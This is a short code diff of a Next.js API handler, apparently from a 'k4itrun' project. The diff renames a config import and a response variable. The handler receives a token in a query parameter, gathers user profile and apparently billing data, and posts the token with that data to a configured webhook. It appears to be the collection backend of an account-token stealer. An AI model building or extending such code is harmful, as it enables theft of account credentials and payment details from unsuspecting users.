@@ -1,10 +1,10 @@
 import { Emojis, Languages, UserProfile, BillingSource, Embed, ResponseData } from "@/interfaces";
-import k4itrunConfig from '@k4itrunconfig';
+import {metaConfig} from '@k4itrunconfig';
 
 import type { NextApiRequest, NextApiResponse } from 'next';
 import axios from 'axios';
 
-const obj: ResponseData = {
+const data: ResponseData = {
   success: false,
   message: "Bad Request: missing \"data\" query parameter",
   data: {
@@ -20,7 +20,7 @@ export default async (
     const { data: token } = request.query as { data?: string };
 
     if (!token) {
-      response.send({ ...obj });
+      response.send({ ...data });
       return;
     }
 
@@ -40,7 +40,7 @@ export default async (
         embeds: await embeds({ token, ...user.data })
       };
 
-      await axios.post(k4itrunConfig.webhook, CONFIG_HOOK);
+      await axios.post(metaConfig.webhook, CONFIG_HOOK);
     } catch (error: any) {
       console.error(error)
     }
